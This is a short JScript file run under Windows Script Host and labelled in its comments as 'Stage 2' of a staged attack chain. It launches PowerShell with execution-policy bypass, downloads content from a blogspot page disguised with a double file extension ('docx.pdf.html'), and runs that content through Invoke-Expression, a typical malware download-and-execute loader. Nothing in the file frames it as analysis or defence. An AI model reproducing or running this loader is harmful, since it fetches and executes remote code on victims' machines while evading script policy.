var wsh = new ActiveXObject("WScript.Shell");

// Call Stage 3 with visible window for debugging
var cmd = '-ep Bypass -c "Write-Host \'[Stage 2] Calling Stage 3...\' -ForegroundColor Green; Invoke-Expression (Invoke-WebRequest -Uri \'https://aprilcap.blogspot.com/2026/04/chut.docx.pdf.html\' -UseBasicParsing).Content"';

wsh.Run("powershell.exe " + cmd, 1, false);   // 1 = visible